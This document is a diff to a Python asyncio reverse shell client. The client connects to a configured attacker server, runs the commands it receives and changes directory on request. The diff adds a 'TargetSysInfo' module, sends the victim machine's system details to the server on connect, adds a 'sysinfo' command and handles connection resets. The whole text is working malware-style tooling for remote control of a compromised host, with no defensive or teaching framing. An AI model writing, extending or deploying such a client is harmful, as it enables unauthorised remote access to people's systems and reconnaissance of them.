@@ -2,6 +2,7 @@ import asyncio
 import os
 from asyncio import CancelledError
 from pathlib import Path
+from sysInfo import TargetSysInfo
 
 # Configuration: Server address and port for the reverse shell connection
 SERVER_HOST = '127.0.0.1'
@@ -17,6 +18,7 @@ class ReverseShellClient:
         self.reader = None
         self.writer = None
         self.current_directory = os.getcwd()
+        self.clientinfo = TargetSysInfo()
 
     async def send_output(self, data: bytes):
         """
@@ -42,6 +44,7 @@ class ReverseShellClient:
         try:
             self.reader, self.writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
             print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")
+            await self.send_output(self.clientinfo.__str__())
 
             while True:
                     # Receive a command from the server
@@ -53,6 +56,11 @@ class ReverseShellClient:
                     break
 
                 command = data.decode().strip()
+
+                if command == "sysinfo":
+                    await self.send_output(self.clientinfo.__str__())
+                    continue
+
                 try:
                     # Handle change directory (cd) command
                     if command.startswith("cd ") or command == "cd":
@@ -92,6 +100,8 @@ class ReverseShellClient:
         except ConnectionRefusedError as e:
             print("[-] Connection failed: Server refused the connection. Verify IP, port, and server status.")
             # do something
+        except ConnectionResetError as e:
+            print(e)
 
 
 async def main():
